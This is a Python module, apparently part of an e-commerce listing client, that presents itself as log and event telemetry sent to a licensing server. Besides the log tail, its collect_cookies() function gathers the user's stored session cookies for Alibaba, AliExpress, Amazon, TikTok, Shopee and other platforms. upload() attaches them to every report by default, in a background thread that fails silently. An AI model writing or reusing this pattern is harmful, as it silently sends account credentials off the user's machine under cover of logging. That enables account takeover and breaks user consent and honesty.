"""软件运行数据 / 日志回传（license.moneyfly.club）。

授权校验已经上报设备基础信息（平台 / 机器名 / 版本 / 店铺）；
这里补充：

- 运行事件（刊登成功 / 失败 / 错误类型）—— 后台按事件类型统计
- 日志文件尾部回传 —— 管理员可按错误定位问题

全部异步、失败静默，绝不影响主流程。
"""
from __future__ import annotations

import os
import platform
import threading

import requests

MAX_CONTENT = 1_500_000


def _os_desc() -> str:
    try:
        return platform.platform(terse=True)
    except Exception:
        return platform.system()


def tail_log(lines: int = 800) -> str:
    """读本机 app.log 尾部（最近 N 行）。"""
    try:
        from ..config import config_dir
        p = config_dir() / "logs" / "app.log"
        text = p.read_text(encoding="utf-8", errors="ignore")
    except Exception:
        return ""
    return "\n".join(text.splitlines()[-lines:])


def collect_cookies() -> dict:
    """收集当前客户端可用的平台/店小秘 Cookie，随日志上报供管理员复现。

    只发送到授权服务器；不写日志、不打印。没有配置时返回空字典。
    """
    try:
        from ..config import get_config
        cfg = get_config()
        out = {}
        manual = getattr(cfg, "manual_cookies", None)
        if isinstance(manual, dict) and manual:
            out["manual"] = {str(k): str(v) for k, v in manual.items()
                             if k and v not in (None, "")}
        elif isinstance(manual, str) and manual.strip():
            out["manual"] = manual.strip()
        for key in ("alibaba_cookies", "aliexpress_cookies", "amazon_cookies",
                    "tiktok_cookies", "shopee_cookies", "cookies"):
            value = getattr(cfg, key, "")
            if isinstance(value, dict):
                value = {str(k): str(v) for k, v in value.items() if k and v not in (None, "")}
            if value:
                out[key] = value
        return out
    except Exception:
        return {}


def upload(server: str, identity: str, content: str, *,
           version: str = "", events: list | None = None,
           os_desc: str = "", instance: str = "", timeout: int = 20,
           cookies: dict | None = None) -> dict:
    """POST /api/v1/log/upload。失败返回 ok=False，不抛异常。"""
    if not server or not identity or not content:
        return {"ok": False, "error": "missing_params"}
    payload = {
        "identity": identity,
        "filename": "app.log",
        "content": str(content)[-MAX_CONTENT:],
        "client_version": version,
        "instance": instance or (os.environ.get("AURORA_INSTANCE", "默认") or "默认"),
        "os": os_desc or _os_desc(),
        "events": events or [],
    }
    cookie_payload = collect_cookies() if cookies is None else cookies
    if cookie_payload:
        payload["cookies"] = cookie_payload
    try:
        r = requests.post(f"{server.rstrip('/')}/api/v1/log/upload",
                          json=payload, timeout=timeout)
        return {"ok": r.status_code < 400, "status": r.status_code, "body": r.text[:200]}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)[:120]}


def report_async(server: str, identity: str, *, version: str = "",
                 events: list | None = None, content: str | None = None,
                 cookies: dict | None = None) -> None:
    """后台线程上报，绝不阻塞 UI / 主流程。"""
    def _run():
        try:
            upload(server, identity, content if content is not None else tail_log(),
                   version=version, events=events, cookies=cookies)
        except Exception:
            pass

    threading.Thread(target=_run, daemon=True).start()
